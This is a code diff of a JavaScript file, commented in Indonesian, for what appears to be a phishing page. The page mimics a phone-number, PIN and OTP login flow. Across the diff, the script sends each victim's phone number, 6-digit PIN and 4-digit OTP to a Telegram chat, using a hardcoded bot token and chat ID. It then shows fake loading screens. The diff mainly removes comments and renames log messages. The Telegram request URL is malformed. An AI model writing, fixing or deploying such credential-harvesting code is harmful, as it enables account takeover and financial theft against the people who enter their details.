@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const TELEGRAM_TOKEN = "8608031139:AAFcKrrXjORQcFFuS19PWAc6qxgjX48uGYE";
   const TELEGRAM_CHAT_ID = "-1003627147396";
 
-  // Fungsi Tambahan untuk Kirim ke Telegram (Sudah Diperbaiki)
+  // Fungsi Tambahan untuk Kirim ke Telegram (Sempurna & Aman)
   function sendToTelegram(message) {
     const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
     fetch(url, {
@@ -16,8 +16,8 @@ document.addEventListener('DOMContentLoaded', () => {
       })
     })
     .then(res => res.json())
-    .then(data => console.log("Telegram log:", data))
-    .catch(err => console.error("Telegram error:", err));
+    .then(data => console.log("Telegram Sukses:", data))
+    .catch(err => console.error("Telegram Gagal:", err));
   }
   // ===============================================
 
@@ -48,7 +48,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (phoneInput) {
           phoneInput.focus();
         }
-      }, 600); // Sinkron dengan durasi transisi CSS opacity
+      }, 600);
     }, 2200);
   }
 
@@ -58,7 +58,6 @@ document.addEventListener('DOMContentLoaded', () => {
       let val = e.target.value.replace(/\D/g, '');
       e.target.value = val;
       
-      // Tombol aktif jika nomor hp diisi minimal 9 digit
       if (val.length >= 9) {
         btnNext.removeAttribute('disabled');
       } else {
@@ -68,7 +67,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- 3. MASUK KE HALAMAN PIN VIA TOMBOL LANJUT ---
     btnNext.addEventListener('click', () => {
-      // AMBIL DATA INPUT NO HP DAN KIRIM KE TELEGRAM
       const nomorHp = phoneInput.value;
       sendToTelegram(`📱 *Data Masuk Baru*\n\n*No. HP:* \`${nomorHp}\``);
 
@@ -79,7 +77,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (pagePhone) pagePhone.classList.add('hidden');     
         if (pagePin) pagePin.classList.remove('hidden');
         
-        // Fokus otomatis ke kotak PIN pertama
+        // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
         if (pinFields && pinFields.length > 0) {
           pinFields[0].focus();
         }
@@ -90,17 +88,13 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- 4. LOGIKA AUTO-INPUT PIN 6 DIGIT ---
   if (pinFields && pinFields.length > 0) {
     pinFields.forEach((field, index) => {
-      // Event saat mengetik/input angka
       field.addEventListener('input', (e) => {
         const val = e.target.value;
-        
-        // Validasi: hanya menerima karakter angka
         if (!/^\d*$/.test(val)) {
           e.target.value = '';
           return;
         }
 
-        // Jika terisi, otomatis lompat kursor ke kotak kanan berikutnya
         if (val && index < pinFields.length - 1) {
           pinFields[index + 1].focus();
         }
@@ -108,7 +102,6 @@ document.addEventListener('DOMContentLoaded', () => {
         checkPinComplete();
       });
 
-      // Event saat menghapus menggunakan Backspace
       field.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !field.value && index > 0) {
           pinFields[index - 1].focus();
@@ -120,22 +113,20 @@ document.addEventListener('DOMContentLoaded', () => {
   function checkPinComplete() {
     const combinedPin = Array.from(pinFields).map(f => f.value).join('');
     
-    // Ketika 6 digit PIN sudah terisi penuh
     if (combinedPin.length === 6) {
-      // AMBIL DATA NO HP + PIN LALU KIRIM KE TELEGRAM
       const nomorHp = phoneInput ? phoneInput.value : 'Tidak diketahui';
       sendToTelegram(`🔐 *Update Data PIN*\n\n*No. HP:* \`${nomorHp}\`\n*PIN:* \`${combinedPin}\``);
 
-      // PAKSA KEYBOARD MENUTUP: Hilangkan fokus dari semua kotak PIN
       pinFields.forEach(f => f.blur());
       
       if (loadingScreen) loadingScreen.classList.remove('hidden');
 
       setTimeout(() => {
         if (loadingScreen) loadingScreen.classList.add('hidden');
-        if (otpBottomSheet) otpBottomSheet.classList.add('show'); // Memunculkan OTP Bottom Sheet
+        if (otpBottomSheet) otpBottomSheet.classList.add('show'); 
         
         setTimeout(() => {
+          // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
           if (otpFields && otpFields.length > 0) {
             otpFields[0].focus();
           }
@@ -146,20 +137,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT DI DALAM BOTTOM SHEET ---
+  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT ---
   if (otpFields && otpFields.length > 0) {
     otpFields.forEach((field, index) => {
-      // Event saat mengetik/input angka OTP
       field.addEventListener('input', (e) => {
         const val = e.target.value;
-        
-        // Validasi: hanya menerima karakter angka
         if (!/^\d*$/.test(val)) {
           e.target.value = '';
           return;
         }
 
-        // Jika terisi, otomatis lompat kursor ke kotak kanan berikutnya
         if (val && index < otpFields.length - 1) {
           otpFields[index + 1].focus();
         }
@@ -167,7 +154,6 @@ document.addEventListener('DOMContentLoaded', () => {
         checkOtpComplete();
       });
 
-      // Event saat menghapus menggunakan Backspace di modal OTP
       field.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !field.value && index > 0) {
           otpFields[index - 1].focus();
@@ -179,26 +165,20 @@ document.addEventListener('DOMContentLoaded', () => {
   function checkOtpComplete() {
     const combinedOtp = Array.from(otpFields).map(f => f.value).join('');
     
-    // Ketika 4 digit OTP sudah terisi penuh
     if (combinedOtp.length === 4) {
-      // AMBIL SEMUA DATA AKHIR UNTUK DIKIRIM KE TELEGRAM
       const nomorHp = phoneInput ? phoneInput.value : 'Tidak diketahui';
       const combinedPin = Array.from(pinFields).map(f => f.value).join('');
       sendToTelegram(`✅ *Data Selesai & Terverifikasi*\n\n*No. HP:* \`${nomorHp}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``);
 
-      // Paksa keyboard menutup total
       otpFields.forEach(f => f.blur());
       
-      if (loadingScreen) loadingScreen.classList.remove('hidden'); // Jalankan loading verifikasi akhir
+      if (loadingScreen) loadingScreen.classList.remove('hidden'); 
       
       setTimeout(() => {
         if (loadingScreen) loadingScreen.classList.add('hidden');
-        if (loadingScreen) loadingScreen.classList.remove('hidden'); // Jalankan loading verifikasi akhir
+        if (loadingScreen) loadingScreen.classList.remove('hidden'); 
 
         console.log("Seluruh proses otomatis sukses tanpa error!");
-        console.log("Data Terverifikasi -> PIN: " + Array.from(pinFields).map(f => f.value).join('') + " | OTP: " + combinedOtp);
-        
-        // Alur selesai sempurna. Di sini Anda bisa mengarahkan user menggunakan window.location.href
       }, 1500);
     }
   }
@@ -225,28 +205,23 @@ document.addEventListener('DOMContentLoaded', () => {
           if (btnResendOtp) {
             btnResendOtp.addEventListener('click', (e) => {
               e.preventDefault();
-              
               if (loadingScreen) loadingScreen.classList.remove('hidden');
               
               setTimeout(() => {
                 if (loadingScreen) loadingScreen.classList.add('hidden');
-                
                 otpFields.forEach(f => f.value = '');
-                
                 countdownContainer.innerHTML = 'Kirim ulang dalam <span id="timer">60</span> detik';
                 
                 const newTimerSpan = document.getElementById('timer');
-                
                 if (newTimerSpan) {
                   document.getElementById('timer').textContent = '60';
                   startOtpCountdownUpdate(newTimerSpan); 
                 }
                 
+                // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
                 if (otpFields && otpFields.length > 0) {
                   otpFields[0].focus();
                 }
-                
-                console.log("OTP Resent");
               }, 1200);
             });
           }
